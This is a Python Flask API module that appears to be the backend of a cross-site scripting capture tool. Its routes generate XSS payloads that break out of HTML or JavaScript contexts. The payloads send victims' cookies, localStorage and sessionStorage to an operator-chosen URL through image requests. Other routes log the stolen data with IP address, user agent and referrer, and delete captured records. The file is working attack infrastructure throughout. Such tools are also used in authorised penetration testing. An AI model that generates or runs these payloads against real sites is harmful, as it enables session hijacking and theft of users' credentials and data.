from flask import jsonify, request
from app import db
from app.models import Client, XSS
from app.api import bp
from flask_login import login_required


@bp.route('/xss/stored/<guid>', methods=['GET'])
def catch_stored_xss(guid):

    client = Client.query.filter_by(guid=guid).first_or_404()

    referer = request.referrer
    user_agent = request.user_agent
    ip_addr = request.remote_addr
    cookies = request.args.get('cookies')
    local_storage = request.args.get('local_storage')
    session_storage = request.args.get('session_storage')
    xss_type = 'stored'
    other_data_dict = request.args.to_dict()
    other_data = ''

    for param, value in other_data_dict.items():
        if not (param == 'cookies' or param == 'local_storage' or param == 'session_storage'):
            other_data += '{}={};'.format(param, value)

    if cookies == '':
        cookies = None

    if local_storage == '' or local_storage == '{}':
        local_storage = None

    if session_storage == '' or session_storage == '{}':
        session_storage = None

    if other_data == '':
        other_data = None

    xss = XSS(referer=referer, user_agent=str(user_agent), ip_addr=ip_addr,
              cookies=cookies, client_id=client.id, xss_type=xss_type, local_storage=local_storage, session_storage=session_storage, other_data=other_data)
    db.session.add(xss)
    db.session.commit()

    return jsonify({'status': 'OK'})


@bp.route('/xss/reflected/<guid>', methods=['GET'])
def catch_reflected_xss(guid):

    client = Client.query.filter_by(guid=guid).first_or_404()

    referer = request.referrer
    user_agent = request.user_agent
    ip_addr = request.remote_addr
    cookies = request.args.get('cookies')
    local_storage = request.args.get('local_storage')
    session_storage = request.args.get('session_storage')
    xss_type = 'reflected'
    other_data_dict = request.args.to_dict()
    other_data = ''

    for param, value in other_data_dict.items():
        if not (param == 'cookies' or param == 'local_storage' or param == 'session_storage'):
            other_data += '{}={};'.format(param, value)

    if cookies == '':
        cookies = None

    if local_storage == '' or local_storage == '{}':
        local_storage = None

    if session_storage == '' or session_storage == '{}':
        session_storage = None

    if other_data == '':
        other_data = None

    xss = XSS(referer=referer, user_agent=str(user_agent), ip_addr=ip_addr,
              cookies=cookies, client_id=client.id, xss_type=xss_type, local_storage=local_storage, session_storage=session_storage, other_data=other_data)
    db.session.add(xss)
    db.session.commit()

    return jsonify({'status': 'OK'})


@bp.route('/xss/generate/<id>', methods=['GET'])
@login_required
def gen_xss(id):

    url = request.args.get('url')
    is_stored = request.args.get('stored')
    is_cookie = request.args.get('cookie')
    is_local_storage = request.args.get('session')
    is_session_storage = request.args.get('local')
    client = Client.query.filter_by(id=id).first_or_404()
    guid = client.guid
    code_type = request.args.get('code')
    other_data_dict = request.args.to_dict()
    other_data = '"&'

    for param, value in other_data_dict.items():
        if not (param == 'url' or param == 'stored' or param == 'cookie' or param == 'session' or param == 'local' or param == 'code'):
            other_data += '{}={}&'.format(param, value)

    other_data = other_data.rstrip('&')
    other_data += '"'

    if code_type == 'js':
        payload = """;}; """
    else:
        payload = """'>">"""

    if is_stored:
        xss_type = 'stored'
    else:
        xss_type = 'reflected'

    if is_cookie or is_local_storage or is_session_storage:

        if code_type == 'html':
            payload += """<script>"""

        payload += """new Image().src="{}/api/xss/{}/{}?""".format(
            url, xss_type, guid)

        if is_cookie:
            payload += """cookies="+encodeURIComponent(document.cookie)"""

        if is_local_storage:
            if is_cookie:
                payload += """+"&local_storage="+encodeURIComponent(JSON.stringify(localStorage))"""
            else: 
                payload += """local_storage="+encodeURIComponent(JSON.stringify(localStorage))"""

        if is_session_storage:
            if is_cookie or is_local_storage:
                payload += """+"&session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))"""
            else:
                payload += """session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))"""

        print(other_data)
        if other_data != '""':
            payload += "+" + other_data

        if code_type == 'js':
            payload += """;"""
        else: 
            payload += """</script>"""

    else:
        if other_data != '""':
            payload += """<img src="{}/api/xss/{}/{}?{}" />""".format(url, xss_type, guid, other_data.lstrip('"').lstrip('&').rstrip('"'))
        else:
            payload += """<img src="{}/api/xss/{}/{}" />""".format(url, xss_type, guid)

    return (payload)


@bp.route('/xss/<id>', methods=['DELETE'])
@login_required
def delete_xss(id):

    xss = XSS.query.filter_by(id=id).first_or_404()

    db.session.delete(xss)
    db.session.commit()

    return jsonify({'status': 'OK'})


@bp.route('/xss/<id>/cookies', methods=['DELETE'])
@login_required
def delete_cookie(id):

    xss = XSS.query.filter_by(id=id).first_or_404()

    xss.cookies = None
    db.session.commit()

    return jsonify({'status': 'OK'})


@bp.route('/xss/<id>/local_storage', methods=['DELETE'])
@login_required
def delete_local_storage(id):

    xss = XSS.query.filter_by(id=id).first_or_404()

    xss.local_storage = None
    db.session.commit()

    return jsonify({'status': 'OK'})


@bp.route('/xss/<id>/session_storage', methods=['DELETE'])
@login_required
def delete_session_storage(id):

    xss = XSS.query.filter_by(id=id).first_or_404()

    xss.session_storage = None
    db.session.commit()

    return jsonify({'status': 'OK'})


@bp.route('/xss/<id>/other_data', methods=['DELETE'])
@login_required
def delete_other_data(id):

    xss = XSS.query.filter_by(id=id).first_or_404()

    xss.other_data = None
    db.session.commit()

    return jsonify({'status': 'OK'})
